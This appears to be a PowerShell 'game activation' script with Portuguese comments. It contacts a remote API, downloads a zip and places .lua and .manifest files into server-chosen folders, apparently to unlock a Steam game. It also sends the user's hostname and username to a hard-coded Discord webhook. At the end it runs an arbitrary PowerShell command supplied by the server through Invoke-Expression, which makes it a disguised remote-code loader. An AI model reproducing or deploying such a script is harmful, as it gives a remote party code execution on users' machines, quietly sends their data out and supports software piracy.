# 1. Configurações Iniciais
$API_URL = "https://gaamingsteam.squareweb.app/api/app/"
$APP_ID = "kastexstorms"
$ID_JOGO = "2215200"
$WEBHOOK_URL = "https://discord.com/api/webhooks/1504479978652303531/mL7S7SbUoOVYplPtqJvQHOX1UeZFxoLSXgPYCvHDkepJbJVu6PSZgjhzGOfxW4yegEq0"

$HOSTNAME_PC = hostname
$USUARIO = whoami
$DATA = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
$STATUS = "✅ Sucesso"

# Função para janelas de aviso
function Show-MessageBox {
    param([string]$Message, [string]$Title)
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show($Message, $Title)
}

# 2. Consultar API
$UrlFinal = "$API_URL$APP_ID/$ID_JOGO"
try {
    $response = Invoke-RestMethod -Uri $UrlFinal -Method Get -TimeoutSec 10
} catch {
    Show-MessageBox -Message "Erro ao conectar ao servidor. Verifique sua internet." -Title "Erro"
    exit
}

if (-not $response.ativo) {
    Show-MessageBox -Message "Acesso desativado ou expirado." -Title "Licença Inválida"
    exit
}

# 3. Preparar Pastas e Download
$DocsPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("MyDocuments"), "conteudo")
if (-not (Test-Path $DocsPath)) { New-Item -ItemType Directory -Path $DocsPath | Out-Null }

$ZipDestino = Join-Path $DocsPath "$ID_JOGO.zip"
try {
    Invoke-WebRequest -Uri $response.url_zip -OutFile $ZipDestino
} catch {
    $STATUS = "❌ Falhou no Download"
}

# 4. Extração e Ativação
$reiniciar = $false
if (Test-Path $ZipDestino) {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zip = [System.IO.Compression.ZipFile]::OpenRead($ZipDestino)
    foreach ($entry in $zip.Entries) {
        $path = $null
        if ($entry.Name.ToLower().EndsWith(".lua")) { $path = $response.caminho_lua }
        elseif ($entry.Name.ToLower().EndsWith(".st") -or $entry.Name.ToLower().EndsWith(".manifest")) { $path = $response.caminho_manifest }
        
        if ($path) {
            if (-not (Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
            [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, (Join-Path $path $entry.Name), $true)
            $reiniciar = $true
        }
    }
    $zip.Dispose()
    Remove-Item $ZipDestino -Force
}

# 5. Enviar Log ao Discord
$Payload = @{
    embeds = @(@{
        title = "📊 Relatório de Execução"
        color = 3066993
        fields = @(
            @{ name = "🎮 ID"; value = $ID_JOGO; inline = $true }
            @{ name = "💻 PC"; value = $HOSTNAME_PC; inline = $true }
            @{ name = "👤 Usuário"; value = $USUARIO; inline = $true }
            @{ name = "📅 Data"; value = $DATA; inline = $true }
            @{ name = "Status"; value = $STATUS; inline = $false }
        )
    })
} | ConvertTo-Json -Depth 4

Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $Payload -ContentType "application/json"

# 6. Finalização
if ($reiniciar -and $response.comando_powershell) {
    Invoke-Expression $response.comando_powershell
}
Show-MessageBox -Message "Jogo ativado com sucesso! oferecimento ZYPY" -Title "Status"
